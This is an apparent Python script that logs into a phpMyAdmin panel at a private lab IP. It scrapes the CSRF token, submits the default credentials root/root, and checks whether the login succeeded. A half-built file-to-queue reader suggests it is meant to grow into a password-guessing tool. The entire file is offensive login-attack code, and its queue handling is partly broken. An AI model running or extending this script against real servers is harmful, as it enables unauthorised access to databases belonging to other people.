import aiofiles
import re
import aiohttp
import asyncio

# 非dns解析情况下cookie设置
jar = aiohttp.CookieJar(unsafe=True)
# 队列停止符
end_flag = object()


async def read_file(filename, queue):
    async with aiofiles.open(filename, mode="r", encoding="utf-8") as f:
        while True:
            line = await f.readline()
            if not line:
                break
            else:
                line = line.strip("\n")
                queue.put(line)
        queue.put(end_flag)


async def handle_request(session, url, method, **kwargs):
    """处理请求"""
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
    }
    if method == "GET":
        async with session.get(url=url, headers=header, verify_ssl=False) as response:
            return await response.text()
    elif method == "POST":
        data = {
            "pma_username": kwargs.get("username"),
            "pma_password": kwargs.get("password"),
            "server": "1",
            "lang": "zh_CN",
            "token": kwargs.get("token")
        }
        async with session.post(url=url, headers=header, data=data, verify_ssl=False) as response:
            return await response.text()


async def phpmyadmin_request(url):
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        # 第一次请求获取token
        first_response = await handle_request(session=session, url=url, method="GET")
        # 获取token
        token_search = re.compile(r'token=(.*?)"\s?target')
        token = token_search.search(first_response)

        if not token:
            print("获取token失败")
            return
        else:
            token_value = token.group(1)
            login_url = "http://192.168.52.143/phpmyadmin/index.php"
            # 第二次请求登录
            await handle_request(session=session, url=login_url, method="POST", username="root",
                                 password="root",
                                 token=token_value)
            # 首页
            index_url = "http://192.168.52.143/phpmyadmin/main.php?token={}".format(token_value)
            index_response = await handle_request(session=session, url=index_url, method="GET")
            if "常规设置" in index_response:
                print("登录成功")


async def main():
    url = "http://192.168.52.143/phpMyAdmin/"
    await phpmyadmin_request(url=url)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
